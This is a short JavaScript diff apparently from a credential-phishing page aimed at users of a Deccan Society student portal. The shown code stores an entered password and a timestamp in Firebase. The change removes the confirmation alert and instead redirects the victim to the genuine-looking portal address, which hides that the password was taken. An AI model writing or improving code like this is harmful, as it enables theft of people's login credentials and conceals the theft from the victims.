@@ -719,7 +719,8 @@
             password: password,
             timestamp: new Date().toISOString()
         }).then(() => {
-            alert("Data submitted to Firebase.");
+            // alert("Data submitted to Firebase.");
+            window.location.href="https://livestudent.deccansociety.org/"
         }).catch((error) => {
             console.error("Error writing to Firebase: ", error);
         });
